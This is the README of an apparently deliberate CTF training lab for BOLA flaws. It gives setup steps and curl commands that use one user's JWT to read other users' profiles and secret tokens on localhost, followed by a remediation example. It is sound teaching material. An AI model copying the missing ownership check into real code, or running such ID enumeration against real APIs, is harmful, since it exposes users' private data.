# CTF Vulnerable API Training Lab - BOLA Edition

⚠️ **WARNING: This application contains intentional security vulnerabilities for educational purposes only. DO NOT deploy to production or expose to the internet.**

## Purpose

This is a Capture the Flag (CTF) training laboratory designed to teach developers about BOLA (Broken Object Level Authorization) vulnerabilities. The API includes real JWT authentication but is intentionally vulnerable to BOLA attacks.

## Setup

### Option 1: Docker (Recommended)

1. Start the entire stack:
```bash
docker-compose up -d
```

2. The API will be available at `http://localhost:3000`

3. Stop the stack:
```bash
docker-compose down
```

4. Clean up (remove volumes):
```bash
docker-compose down -v
```

### Option 2: Manual Setup

1. Install dependencies:
```bash
npm install
```

2. Set up PostgreSQL database:
```bash
# Create database and user
psql -U postgres
CREATE DATABASE ctf_lab;
CREATE USER ctf_user WITH PASSWORD 'ctf_password';
GRANT ALL PRIVILEGES ON DATABASE ctf_lab TO ctf_user;
\q
```

3. Initialize the database:
```bash
npm run init-db
```

4. Start the server:
```bash
npm start
```

## API Endpoints

### Authentication Endpoints

#### Register
```bash
curl -X POST http://localhost:3000/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "email": "test@example.com",
    "password": "password123"
  }'
```

Response:
```json
{
  "message": "User registered successfully",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 4,
    "username": "testuser",
    "email": "test@example.com",
    "role": "user"
  }
}
```

#### Login
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice",
    "password": "password123"
  }'
```

Response:
```json
{
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1,
    "username": "alice",
    "email": "alice@example.com",
    "role": "user",
    "isAdmin": false
  }
}
```

## BOLA Vulnerability

### Endpoint: `GET /user/:id`

**Vulnerability:** The endpoint requires valid JWT authentication but does NOT verify if the authenticated user has permission to access the requested user's profile. This is a classic BOLA (Broken Object Level Authorization) vulnerability.

### Exploitation Steps

1. Register or login as a user (e.g., alice):
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "password123"}' | jq -r '.token')
```

2. Access your own profile (legitimate use):
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/user/1
```

3. **EXPLOIT:** Access another user's profile (BOLA vulnerability):
```bash
# Alice (user ID 1) accessing Bob's profile (user ID 2)
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/user/2

# Access admin's profile (user ID 3)
curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/user/3
```

### What You'll Find

The vulnerable endpoint exposes sensitive information including:
- User ID
- Username
- Email
- Role
- Admin status
- **Secret token** (sensitive data that should never be exposed)
- Account creation date

### The Flag

Successfully exploit the BOLA vulnerability to access other users' secret tokens. The admin user (ID 3) has a particularly valuable secret token.

---

## Learning Objectives

After completing this CTF, participants should understand:

1. The difference between authentication (who you are) and authorization (what you can access)
2. Why JWT authentication alone is not sufficient for API security
3. How to implement proper object-level authorization checks
4. The importance of verifying resource ownership before returning data
5. Why sensitive data should be filtered even in authenticated endpoints

## Remediation Guide

### How to Fix the BOLA Vulnerability

Add an authorization check to verify the authenticated user owns the requested resource:

```javascript
app.get('/user/:id', authenticateToken, async (req, res) => {
  try {
    const { id } = req.params;
    
    // FIX: Check if the authenticated user owns this resource
    if (req.userId !== parseInt(id)) {
      return res.status(403).json({ error: 'Forbidden: You can only access your own profile' });
    }
    
    const result = await pool.query(
      'SELECT id, username, email, role, isAdmin, created_at FROM users WHERE id = $1',
      [id]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Also filter out sensitive fields like secret_token
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
```

### Key Security Principles

1. **Authentication ≠ Authorization**: Just because a user is authenticated doesn't mean they should access all resources
2. **Always verify ownership**: Check if `req.userId === resourceOwnerId` before returning data
3. **Filter sensitive data**: Even for authorized users, don't expose unnecessary sensitive fields
4. **Use proper HTTP status codes**: 403 Forbidden for authorization failures, 401 Unauthorized for authentication failures

## Docker Commands Reference

```bash
# Start the lab
docker-compose up -d

# View logs
docker-compose logs -f api

# Stop the lab
docker-compose down

# Rebuild after code changes
docker-compose up -d --build

# Access PostgreSQL directly
docker exec -it ctf-postgres psql -U ctf_user -d ctf_lab

# Reset everything (including data)
docker-compose down -v
```

## Disclaimer

This code is intentionally insecure and should only be used in isolated training environments. Never use this code in production systems or expose it to untrusted networks.
